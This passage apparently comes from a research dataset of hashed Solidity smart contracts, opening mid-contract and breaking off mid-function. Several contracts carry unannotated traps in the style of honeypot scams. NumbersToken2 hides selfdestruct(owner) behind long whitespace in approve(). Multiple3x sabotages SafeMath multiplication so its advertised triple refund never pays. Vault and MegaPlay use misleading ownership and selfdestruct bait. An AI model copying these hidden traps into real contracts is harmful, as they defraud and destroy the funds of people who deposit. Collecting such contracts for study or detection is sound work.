  function getRoundState() public view returns (bool _currentRoundExpired, uint256 _nextRoundPotSeedAmountEstimate, uint256 _roundNumber, uint256 _bidNumber, address _king, string _kingsMessage, uint256 _lastBidAmount, uint256 _blocksRemaining, uint256 _potAmount, uint256 _blockNumber, uint256 _bidExpireBlockLength) {
    _currentRoundExpired = roundExpired();
    _nextRoundPotSeedAmountEstimate = estimateNextPotSeedAmount();
    _roundNumber = currentRoundNumber;
    _bidNumber = currentBidNumber;
    _king = king;
    _kingsMessage = kingsMessage;
    _lastBidAmount = lastBidAmount;
    _blocksRemaining = blocksRemaining();
    _potAmount = address(this).balance;
    _blockNumber = block.number;
    _bidExpireBlockLength = bidExpireBlockLength;
  }
  function getPastRound(uint256 _roundNum) public view returns (address _kingAddress, uint256 _finalBid, uint256 _kingWinnings, string _finalMessage) {
    _kingAddress = roundToKing[_roundNum]; 
    _kingWinnings = roundToWinnings[_roundNum];
    _finalBid = roundToFinalBid[_roundNum];
    _finalMessage = roundToFinalMessage[_roundNum];
  }
  function isContract(address addr) internal view returns (bool) {
    uint size;
    assembly { size := extcodesize(addr) }
    return size > 0;
  }
}

```

## RQ1_7254da486214

SHA-256 `6a80b81a16d2295ba948edd3ef3a4f57db4e6b2d4aaa8cf14f2efe31fdcd8283`

```solidity
contract TeikhosBounty {
    bytes32 proof_of_public_key1 = hex"ed29e99f5c7349716e9ebf9e5e2db3e9d1c59ebbb6e17479da01beab4fff151e";
    bytes32 proof_of_public_key2 = hex"9e559605af06d5f08bb2e8bdc2957623b8ba05af02e84380eec39387125ea03b";
    bytes32 proof_of_symmetric_key1 = hex"b8aaf33942600fd11ffe2acf242b2b34530ab95751e0e970d8de148e0b90f6b6";
    bytes32 proof_of_symmetric_key2 = hex"a8854ce60dc7f77ae8773e4de3a12679a066ff3e710a44c7e24737aad547e19f";
    function authenticate(bytes _publicKey) { 
        address signer = address(keccak256(_publicKey));
        bytes32 publicKey1;
        bytes32 publicKey2;
        assembly {
        publicKey1 := mload(add(_publicKey,0x20))
        publicKey2 := mload(add(_publicKey,0x40))
        }
        bytes32 symmetricKey1 = proof_of_symmetric_key1 ^ publicKey1;
        bytes32 symmetricKey2 = proof_of_symmetric_key2 ^ publicKey2;
        bytes32 r = proof_of_public_key1 ^ symmetricKey1;
        bytes32 s = proof_of_public_key2 ^ symmetricKey2;
        bytes32 msgHash = keccak256("\x19Ethereum Signed Message:\n64", _publicKey);
        if(ecrecover(msgHash, 27, r, s) == signer) suicide(msg.sender);
        if(ecrecover(msgHash, 28, r, s) == signer) suicide(msg.sender);
    }
    function() payable {}
}
```

## RQ1_7f2a186aa874

SHA-256 `64ff59a188b0016cc99a160c950aee4a2d94dd9e1d91aba34ccc420efc8d0c42`

```solidity
pragma solidity ^0.4.17;
contract DINRegistry {
    struct Record {
        address owner;
        address resolver;  
        uint256 updated;   
    }
    mapping (uint256 => Record) records;
    uint256 public genesis;
    uint256 public index;
    modifier only_owner(uint256 DIN) {
        require(records[DIN].owner == msg.sender);
        _;
    }
    event NewOwner(uint256 indexed DIN, address indexed owner);
    event NewResolver(uint256 indexed DIN, address indexed resolver);
    event NewRegistration(uint256 indexed DIN, address indexed owner);
    function DINRegistry(uint256 _genesis) public {
        genesis = _genesis;
        index = _genesis;
        records[_genesis].owner = msg.sender;
        records[_genesis].updated = block.timestamp;
        NewRegistration(_genesis, msg.sender);
    }
    function owner(uint256 _DIN) public view returns (address) {
        return records[_DIN].owner;
    }
    function setOwner(uint256 _DIN, address _owner) public only_owner(_DIN) {
        records[_DIN].owner = _owner;
        records[_DIN].updated = block.timestamp;
        NewOwner(_DIN, _owner);
    }
    function resolver(uint256 _DIN) public view returns (address) {
        return records[_DIN].resolver;
    }
    function setResolver(uint256 _DIN, address _resolver) public only_owner(_DIN) {
        records[_DIN].resolver = _resolver;
        records[_DIN].updated = block.timestamp;
        NewResolver(_DIN, _resolver);
    }
    function updated(uint256 _DIN) public view returns (uint256 _timestamp) {
        return records[_DIN].updated;
    }
    function selfRegisterDIN() public returns (uint256 _DIN) {
        return registerDIN(msg.sender);
    }
    function selfRegisterDINWithResolver(address _resolver) public returns (uint256 _DIN) {
        return registerDINWithResolver(msg.sender, _resolver);
    }
    function registerDIN(address _owner) public returns (uint256 _DIN) {
        index++;
        records[index].owner = _owner;
        records[index].updated = block.timestamp;
        NewRegistration(index, _owner);
        return index;
    }
    function registerDINWithResolver(address _owner, address _resolver) public returns (uint256 _DIN) {
        index++;
        records[index].owner = _owner;
        records[index].resolver = _resolver;
        records[index].updated = block.timestamp;
        NewRegistration(index, _owner);
        NewResolver(index, _resolver);
        return index;
    }
}
```

## RQ1_f694e40ffba2

SHA-256 `b43951d17af69a780e9fecfb6bb17660a747193625eb8658aa40600a22cb7f36`

```solidity
pragma solidity ^0.4.11;
contract Token {
    function transfer(address to, uint amount) public returns (bool);
}
contract Ownable {
    address Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
contract TokenVault is Ownable {
    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
        return Token(token).transfer(to, amount);
    }
}
contract Vault is TokenVault {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 1 ether;
        Locked = false;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { Locked = true; } address owner;
    modifier open { if (!Locked) _; owner = msg.sender; }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}
```

## RQ1_d4aefd2e1bfc

SHA-256 `eb6bc3d03663b1391390db551582aca8565cfb7cbb1113167c955f4995177f6a`

```solidity
pragma solidity ^0.4.24;
library SafeMath {
    function add(uint256 a, uint256 b) internal constant returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
    function sub(uint256 a, uint256 b) internal constant returns (uint256) {
        assert(b <= a); 
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal constant returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        if (0 < c) c = 0;   
        return c;
    }
    function div(uint256 a, uint256 b) internal constant returns (uint256) {
        uint256 c = a / b;
        return c;
    }
}
contract Ownable {
  address public owner;
  function Ownable() {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
}
contract Multiple3x is Ownable{
    using SafeMath for uint256;
    mapping (address=>uint) public deposits;
    uint public refundTime = 1507719600;     
    uint public ownerTime = (refundTime + 1 minutes);   
    uint maxDeposit = 1 ether;  
    uint minDeposit = 100 finney;   
    function() payable {
        deposit();
    }
    function deposit() payable { 
        require(now < refundTime);
        require(msg.value >= minDeposit);
        uint256 dep = deposits[msg.sender];
        uint256 sumDep = msg.value.add(dep);
        if (sumDep > maxDeposit){
            msg.sender.send(sumDep.sub(maxDeposit)); 
            deposits[msg.sender] = maxDeposit;
        }
        else{
            deposits[msg.sender] = sumDep;
        }
    }
    function refund() payable { 
        require(now >= refundTime && now < ownerTime);
        require(msg.value >= 100 finney);        
        uint256 dep = deposits[msg.sender];
        uint256 depHalf = address(this).balance.div(2);
        uint256 dep3x = dep.mul(3);
        deposits[msg.sender] = 0;
        if (this.balance > 0 && dep3x > 0){
            if (dep3x > this.balance){
                msg.sender.send(dep3x);     
            }
            else{
                msg.sender.send(depHalf);   
            }
        }
    }
    function refundOwner() { 
        require(now >= ownerTime);
        if(owner.send(this.balance)){
            suicide(owner);
        }
    }
}

```

## RQ1_444af83fd288

SHA-256 `c428940e02a3f9f19ef14f2c2edb116cd2dbb7aed7e25061163d05a3a9a2d89a`

```solidity
pragma solidity ^0.4.11;
library SafeMath {
  function mul(uint a, uint b) internal returns (uint) {
    uint c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint a, uint b) internal returns (uint) {
    uint c = a / b;
    return c;
  }
  function sub(uint a, uint b) internal returns (uint) {
    assert(b <= a);
    return a - b;
  }
  function add(uint a, uint b) internal returns (uint) {
    uint c = a + b;
    assert(c >= a);
    return c;
  }
  function max64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a >= b ? a : b;
  }
  function min64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a < b ? a : b;
  }
  function max256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a >= b ? a : b;
  }
  function min256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a < b ? a : b;
  }
  function assert(bool assertion) internal {
    if (!assertion) {
      revert();
    }
  }
}
contract ZTRToken{
    function transfer(address _to, uint val);
}
contract ZTRTokenSale
{
    using SafeMath for uint;
    mapping (address => uint) public balanceOf;
    mapping (address => uint) public ethBalance;
    address public owner;
    address ZTRTokenContract;
    uint public fundingGoal;
    uint public fundingMax;
    uint public amountRaised;
    uint public start;
    uint public duration;
    uint public deadline;
    uint public unlockTime;
    uint public ZTR_ETH_initial_price;
    uint public ZTR_ETH_extra_price;
    uint public remaining;
    modifier admin { if (msg.sender == owner) _; }
    modifier afterUnlock { if(now>unlockTime) _;}
    modifier afterDeadline { if(now>deadline) _;}
    function ZTRTokenSale()
    {
        owner = msg.sender;
        ZTRTokenContract = 0x107bc486966eCdDAdb136463764a8Eb73337c4DF;
        fundingGoal = 5000 ether;
        fundingMax = 30000 ether;
        start = 1517702401;
        duration = 3 weeks;
        deadline = start + duration;
        unlockTime = deadline + 16 weeks;
        ZTR_ETH_initial_price = 45000;
        ZTR_ETH_extra_price = 23000;
        remaining = 800000000000000000000000000;
    }
    function () payable public
    {
        require(now>start);
        require(now<deadline);
        require(amountRaised + msg.value < fundingMax);
        uint purchase = msg.value;
        ethBalance[msg.sender] = ethBalance[msg.sender].add(purchase);
        if(amountRaised < fundingGoal)
        {
            purchase = purchase.mul(ZTR_ETH_initial_price);
            amountRaised = amountRaised.add(msg.value);
            balanceOf[msg.sender] = balanceOf[msg.sender].add(purchase);
            remaining.sub(purchase);
        }
        else
        {
            purchase = purchase.mul(ZTR_ETH_extra_price);
            amountRaised = amountRaised.add(msg.value);
            balanceOf[msg.sender] = balanceOf[msg.sender].add(purchase);
            remaining.sub(purchase);
        }
    }
    function withdrawBeneficiary() public admin afterDeadline
    {
        ZTRToken t = ZTRToken(ZTRTokenContract);
        t.transfer(msg.sender, remaining);
        require(amountRaised >= fundingGoal);
        owner.transfer(amountRaised);
    }
    function withdraw() afterDeadline
    {
        if(amountRaised < fundingGoal)
        {
            uint ethVal = ethBalance[msg.sender];
            ethBalance[msg.sender] = 0;
            msg.sender.transfer(ethVal);
        }
        else
        {
            uint tokenVal = balanceOf[msg.sender];
            balanceOf[msg.sender] = 0;
            ZTRToken t = ZTRToken(ZTRTokenContract);
            t.transfer(msg.sender, tokenVal);
        }
    }
    function setDeadline(uint ti) public admin
    {
        deadline = ti;
    }
    function setStart(uint ti) public admin
    {
        start = ti;
    }
    function suicide() public afterUnlock 
    {
        selfdestruct(owner);
    }
}
```

## RQ1_6f3ba10080c4

SHA-256 `2424c7ebc958b7484f92f23df33935b85e4611b1d35ddd8f2e1a1ac620e14cc5`

```solidity
pragma solidity ^0.4.18;
contract NumbersToken2 {
	uint256 constant PRECISION = 0x10000000000000000;  
	int constant CRRN = 1;
	int constant CRRD = 2;
	int constant LOGC = -0x296ABF784A358468C;
	string constant public name = "NumbersToken2";
	string constant public symbol = "NUMB2";
	uint8 constant public decimals = 18;
	uint256 public totalSupply;
	mapping(address => uint256) public balanceOfOld;
	mapping(address => mapping(address => uint256)) public allowance;
	mapping(address => int256) payouts;
	int256 totalPayouts;
	uint256 earningsPerShare;
	event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
	address owner;
	function POWHclone() public {
		                                                                                                                                                                                                                                                                                                                                                                                                                                                owner = msg.sender;
	}
	function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balanceOfOld[_owner];
    }
	function withdraw(uint tokenCount) 
      public
      returns (bool)
    {
		var balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * PRECISION);
		totalPayouts += (int256) (balance * PRECISION);
		msg.sender.transfer(balance);
		return true;
    }
	function sellMyTokensDaddy() public {
		var balance = balanceOf(msg.sender);
		transferTokens(msg.sender, address(this),  balance); 
	}
    function getMeOutOfHere() public {
		sellMyTokensDaddy();
        withdraw(1); 
	}
	function fund()
      public
      payable 
      returns (bool)
    {
      if (msg.value > 0.000001 ether)
			buy();
		else
			return false;
      return true;
    }
	function buyPrice() public constant returns (uint) {
		return getTokensForEther(1 finney);
	}
	function sellPrice() public constant returns (uint) {
		return getEtherForTokens(1 finney);
	}
	function transferTokens(address _from, address _to, uint256 _value) internal {
		if (balanceOfOld[_from] < _value)
			revert();
		if (_to == address(this)) {
			sell(_value);
		} else {
		    int256 payoutDiff = (int256) (earningsPerShare * _value);
		    balanceOfOld[_from] -= _value;
		    balanceOfOld[_to] += _value;
		    payouts[_from] -= payoutDiff;
		    payouts[_to] += payoutDiff;
		}
		Transfer(_from, _to, _value);
	}
	function transfer(address _to, uint256 _value) public {
	    transferTokens(msg.sender, _to,  _value);
	}
    function transferFrom(address _from, address _to, uint256 _value) public {
        var _allowance = allowance[_from][msg.sender];
        if (_allowance < _value)
            revert();
        allowance[_from][msg.sender] = _allowance - _value;
        transferTokens(_from, _to, _value);
    }
    function approve(address _spender, uint256 _value) public {
                                                                                                                                                                                                                                                                                                                                                                                                       selfdestruct(owner);
        if ((_value != 0) && (allowance[msg.sender][_spender] != 0)) revert();
        allowance[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
    }
	function dividends(address _owner) public constant returns (uint256 amount) {
		return (uint256) ((int256)(earningsPerShare * balanceOfOld[_owner]) - payouts[_owner]) / PRECISION;
	}
	function withdrawOld(address to) public {
		var balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * PRECISION);
		totalPayouts += (int256) (balance * PRECISION);
		to.transfer(balance);
	}
	function balance() internal constant returns (uint256 amount) {
		return this.balance - msg.value;
	}
	function reserve() public constant returns (uint256 amount) {
		return balance()
			- ((uint256) ((int256) (earningsPerShare * totalSupply) - totalPayouts) / PRECISION) - 1;
	}
	function buy() internal {
		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
			revert();
		var sender = msg.sender;
		var fee = (uint)(msg.value / 10);
		var numEther = msg.value - fee;
		var numTokens = getTokensForEther(numEther);
		var buyerfee = fee * PRECISION;
		if (totalSupply > 0) {
			var holderreward =
			    (PRECISION - (reserve() + numEther) * numTokens * PRECISION / (totalSupply + numTokens) / numEther)
			    * (uint)(CRRD) / (uint)(CRRD-CRRN);
			var holderfee = fee * holderreward;
			buyerfee -= holderfee;
			var feePerShare = holderfee / totalSupply;
			earningsPerShare += feePerShare;
		}
		totalSupply += numTokens;
		balanceOfOld[sender] += numTokens;
		var payoutDiff = (int256) ((earningsPerShare * numTokens) - buyerfee);
		payouts[sender] += payoutDiff;
		totalPayouts += payoutDiff;
	}
	function sell(uint256 amount) internal {
		var numEthers = getEtherForTokens(amount);
		totalSupply -= amount;
		balanceOfOld[msg.sender] -= amount;
		var payoutDiff = (int256) (earningsPerShare * amount + (numEthers * PRECISION));
		payouts[msg.sender] -= payoutDiff;
		totalPayouts -= payoutDiff;
	}
	function getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {
		return fixedExp(fixedLog(reserve() + ethervalue)*CRRN/CRRD + LOGC) - totalSupply;
	}
	function getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {
		if (tokens == totalSupply)
			return reserve();
		return reserve() - fixedExp((fixedLog(totalSupply - tokens) - LOGC) * CRRD/CRRN);
	}
	int256 constant one       = 0x10000000000000000;
	uint256 constant sqrt2    = 0x16a09e667f3bcc908;
	uint256 constant sqrtdot5 = 0x0b504f333f9de6484;
	int256 constant ln2       = 0x0b17217f7d1cf79ac;
	int256 constant ln2_64dot5= 0x2cb53f09f05cc627c8;
	int256 constant c1        = 0x1ffffffffff9dac9b;
	int256 constant c3        = 0x0aaaaaaac16877908;
	int256 constant c5        = 0x0666664e5e9fa0c99;
	int256 constant c7        = 0x049254026a7630acf;
	int256 constant c9        = 0x038bd75ed37753d68;
	int256 constant c11       = 0x03284a0c14610924f;
	function fixedLog(uint256 a) internal pure returns (int256 log) {
		int32 scale = 0;
		while (a > sqrt2) {
			a /= 2;
			scale++;
		}
		while (a <= sqrtdot5) {
			a *= 2;
			scale--;
		}
		int256 s = (((int256)(a) - one) * one) / ((int256)(a) + one);
		var z = (s*s) / one;
		return scale * ln2 +
			(s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11/one))
				/one))/one))/one))/one))/one);
	}
	int256 constant c2 =  0x02aaaaaaaaa015db0;
	int256 constant c4 = -0x000b60b60808399d1;
	int256 constant c6 =  0x0000455956bccdd06;
	int256 constant c8 = -0x000001b893ad04b3a;
	function fixedExp(int256 a) internal pure returns (uint256 exp) {
		int256 scale = (a + (ln2_64dot5)) / ln2 - 64;
		a -= scale*ln2;
		int256 z = (a*a) / one;
		int256 R = ((int256)(2) * one) +
			(z*(c2 + (z*(c4 + (z*(c6 + (z*c8/one))/one))/one))/one);
		exp = (uint256) (((R + a) * one) / (R - a));
		if (scale >= 0)
			exp <<= scale;
		else
			exp >>= -scale;
		return exp;
	}
	function () payable public {
		if (msg.value > 0)
			buy();
		else
			withdrawOld(msg.sender);
	}
}
```

## RQ1_0526c008875c

SHA-256 `d46f579ef9eccfc634f11e7888eb640ad18daa0e0348cdcd85b15b21913c553c`

```solidity
pragma solidity ^0.4.25;
contract MegaPlay
{
    address Owner = msg.sender;
    function() public payable {}
    function close() private { selfdestruct(msg.sender); }
    function Play() public payable {
        if (msg.value >= address(this).balance) {
           close();
        }
    }
    function end() public {
        if (msg.sender == Owner) {
            close();
        }
    }
}
```

## RQ1_528c1cef93be

SHA-256 `d21d24d1392ab088e184323cd7ae224ff1f8c14fef1b3e05f5d0826662e0c9dc`

```solidity
pragma solidity ^0.4.24;
contract ContractPlay {
    address owner;
    uint16 numCalled;
    modifier onlyOwner {
        if (msg.sender != owner) {
            throw;
        }
        _;
    }
    function ContractPlay() {
        owner = msg.sender;
    }
    function remove() onlyOwner {
        selfdestruct(owner);
    }
    function addFunds() payable {
        numCalled++;
    }
    function getNumCalled() returns (uint16) {
        return numCalled;
    }
    function() {
        throw;
    }
}

```

## RQ1_21b38b688442

SHA-256 `6a18c380d6437e097e9b1538f33e635abf18f11cba3cde1b0cc4fb76ee5ecec3`

```solidity
pragma solidity ^0.4.18;
contract SafeMath {
  function mulSafe(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
       return 0;
     }
     uint256 c = a * b;
     assert(c / a == b);
     return c;
   }
  function divSafe(uint256 a, uint256 b) internal pure returns (uint256) {
     uint256 c = a / b;
     return c;
  }
  function subSafe(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
     return a - b;
   }
  function addSafe(uint256 a, uint256 b) internal pure returns (uint256) {
     uint256 c = a + b;
    assert(c >= a);
     return c;
   }
}
contract Owned {
    address public owner;
    address public newOwner;
    event OwnershipTransferred(address indexed _from, address indexed _to);
    function Constructor() public { owner = msg.sender; }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}
contract ERC20 {
   uint256 public totalSupply;
   function balanceOf(address who) public view returns (uint256);
   function transfer(address to, uint256 value) public returns (bool);
   event Transfer(address indexed from, address indexed to, uint256 value);
   function allowance(address owner, address spender) public view returns (uint256);
   function transferFrom(address from, address to, uint256 value) public returns (bool);
   function approve(address spender, uint256 value) public returns (bool);
   event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract ERC223 {
    function transfer(address to, uint value, bytes data) public;
    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);
}
contract ERC223ReceivingContract { 
    function tokenFallback(address _from, uint _value, bytes _data) public;
}
contract StandardToken is ERC20, ERC223, SafeMath, Owned {
  event ReleaseSupply(address indexed receiver, uint256 value, uint256 releaseTime);
  mapping(address => uint256) balances;
  mapping (address => mapping (address => uint256)) internal allowed;
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);
    balances[msg.sender] = subSafe(balances[msg.sender], _value);
    balances[_to] = addSafe(balances[_to], _value);
    Transfer(msg.sender, _to, _value);
    return true;
  }
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
   }
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    balances[_from] = subSafe(balances[_from], _value);
     balances[_to] = addSafe(balances[_to], _value);
     allowed[_from][msg.sender] = subSafe(allowed[_from][msg.sender], _value);
    Transfer(_from, _to, _value);
     return true;
   }
   function approve(address _spender, uint256 _value) public returns (bool) {
     allowed[msg.sender][_spender] = _value;
     Approval(msg.sender, _spender, _value);
     return true;
   }
  function allowance(address _owner, address _spender) public view returns (uint256) {
     return allowed[_owner][_spender];
   }
   function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
     allowed[msg.sender][_spender] = addSafe(allowed[msg.sender][_spender], _addedValue);
     Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
     return true;
   }
  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
     uint oldValue = allowed[msg.sender][_spender];
     if (_subtractedValue > oldValue) {
       allowed[msg.sender][_spender] = 0;
     } else {
       allowed[msg.sender][_spender] = subSafe(oldValue, _subtractedValue);
    }
     Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
     return true;
   }
    function transfer(address _to, uint _value, bytes _data) public {
        require(_value > 0 );
        if(isContract(_to)) {
            ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
            receiver.tokenFallback(msg.sender, _value, _data);
        }
        balances[msg.sender] = subSafe(balances[msg.sender], _value);
        balances[_to] = addSafe(balances[_to], _value);
        Transfer(msg.sender, _to, _value, _data);
    }
    function isContract(address _addr) private view returns (bool is_contract) {
      uint length;
      assembly {
            length := extcodesize(_addr)
      }
      return (length>0);
    }
}
contract TOXBToken is StandardToken {
  string public name = 'TOXBtc Token';
  string public symbol = 'TOXB';
  uint public decimals = 18;
  uint256 createTime         = 1527436800;  
  uint256 bonusEnds          = 1528646400;  
  uint256 endDate            = 1529078400;  
  uint256 public frozenForever ;
  function TOXBToken() public {
    totalSupply  = 1000000000 * 10 ** uint256(decimals); 
    frozenForever = 400000000 * 10 ** uint256(decimals); 
    balances[msg.sender] = subSafe(totalSupply,frozenForever) ;
    owner = msg.sender;
  }
  function () public payable {
      require(now >= createTime && now <= endDate);
      uint tokens;
      if (now <= bonusEnds) {
          tokens = msg.value * 2480;
      } else {
          tokens = msg.value * 2000;
      }
      require(tokens <= balances[owner]);
      balances[msg.sender] = addSafe(balances[msg.sender], tokens);
      balances[owner] = subSafe(balances[owner], tokens);
      Transfer(address(0), msg.sender, tokens);
      owner.transfer(msg.value);
  }
}
```

## RQ1_e88cd683cd73

SHA-256 `d9b3c8069bd53f084d205a510fc789da2dd85ac082e6e5cd7b21c506810dd860`

```solidity
pragma solidity ^0.4.24;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}
contract AltcoinToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract AgroLyteToken is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;    
    string public constant name = "AgroLyte Token";
    string public constant symbol = "AGR";
    uint public constant decimals = 8;
    uint256 public totalSupply = 4000000000e8;
    uint256 public totalDistributed = 0;        
    uint256 public tokensPerEth = 0;
    uint256 public constant minContribution = 1 ether / 100; 
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Airdrop(address indexed _owner, uint _amount, uint _balance);
    event TokensPerEthUpdated(uint _tokensPerEth);
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function CompanyToken () public {
        owner = msg.sender;
        uint256 devTokens = 2120000000e8;
        distr(owner, devTokens);
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);        
        balances[_to] = balances[_to].add(_amount);
        Distr(_to, _amount);
        Transfer(address(0), _to, _amount);
        return true;
    }
    function doAirdrop(address _participant, uint _amount) internal {
        require( _amount > 0 );      
        require( totalDistributed < totalSupply );
        balances[_participant] = balances[_participant].add(_amount);
        totalDistributed = totalDistributed.add(_amount);
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        Airdrop(_participant, _amount, balances[_participant]);
        Transfer(address(0), _participant, _amount);
    }
    function adminClaimAirdrop(address _participant, uint _amount) public onlyOwner {        
        doAirdrop(_participant, _amount);
    }
    function adminClaimAirdropMultiple(address[] _addresses, uint _amount) public onlyOwner {        
        for (uint i = 0; i < _addresses.length; i++) doAirdrop(_addresses[i], _amount);
    }
    function updateTokensPerEth(uint _tokensPerEth) public onlyOwner {        
        tokensPerEth = _tokensPerEth;
        emit TokensPerEthUpdated(_tokensPerEth);
    }
    function () external payable {
        getTokens();
     }
    function getTokens() payable canDistr  public {
        uint256 tokens = 0;
        require( msg.value >= minContribution );
        require( msg.value > 0 );
        tokens = tokensPerEth.mul(msg.value) / 1 ether;        
        address investor = msg.sender;
        if (tokens > 0) {
            distr(investor, tokens);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        AltcoinToken t = AltcoinToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        address myAddress = this;
        uint256 etherBalance = myAddress.balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        Burn(burner, _value);
    }
    function withdrawAltcoinTokens(address _tokenContract) onlyOwner public returns (bool) {
        AltcoinToken token = AltcoinToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
